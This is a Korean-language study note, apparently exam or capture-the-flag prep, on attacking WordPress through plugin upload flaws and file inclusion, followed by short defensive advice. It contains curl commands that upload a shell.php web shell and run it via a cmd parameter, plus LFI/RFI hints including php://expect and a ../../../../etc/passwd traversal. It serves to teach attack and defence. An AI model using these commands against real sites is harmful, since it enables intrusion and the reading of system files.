# wordpress

## 개요

워드프레스는 플러그인 구조가 단순해, 일부 플러그인에 파일 인클루전(LFI)이 존재한다.
또한 플러그인 업로드를 통해 웹셸을 올릴 수 있으므로 시험 빈출로 자주 나온다.

## 디렉터리 구조

```text
/var/www/html/
├── wp-admin/            (관리자, 보안 강화됨)
├── wp-content/
│   ├── plugins/         (플러그인 — LFI/업로드 취약점의 후보)
│   │   └── hello.php   👈 Hello Dolly (안전)
│   └── themes/
├── wp-includes/         (핵심 라이브러리)
```

- `hello.php` 같은 기본 플러그인은 문제가 없다. 사용자가 추가한 플러그인을 확인한다.
- 업로드 디렉터리에서 어떤 파일이 있는지 확인해 업로드 취약점을 시도한다.

## 확인 절차

```bash
find /var/www/html/wp-content/uploads -type f -printf '%p\
'
```

## 업로드 공격

```bash
# 1) 이미지/php 업로드 경로 확인 (업로드 폼의 허용 확장자)
curl -F \"file=@shell.php;type=application/x-php\" http://target/wp-admin/async-upload.php

# 2) 업로드된 파일을 역참조하여 실행
curl "http://target/wp-content/uploads/2026/10/shell.php?cmd=id"
```

## 파일 인클루전 (LFI/RFI)

- 파라미터로 파일 경로를 받아 `include()` 한다.
- `php://filter`, `php://expect`, 원격 URL(`http://`)이 가능하면 RFI를 시도한다.
- 경로 순회(`../../../../etc/passwd`)로 권한 없는 파일 읽기를 시도한다.

## 방어

- 업로드 디렉토리의 실행 권한을 제거한다.
- 파일명을 화이트리스트로 검증하고, 확장자를 제한한다.
- include 대상은 화이트리스트된 파일로 제한한다.

## 참고

- `url-encoding.md`(같은 폴더)에 쿠키 디코딩 정리가 있다.
- 플러그인 업로드 취약점은 시험에서 자주 함께 등장한다. 두 문제를 묶어 풀면 된다.
- 모든 테스트는 합법적인 대상(본인 소유·허가받은 시스템)에서만 실행한다.
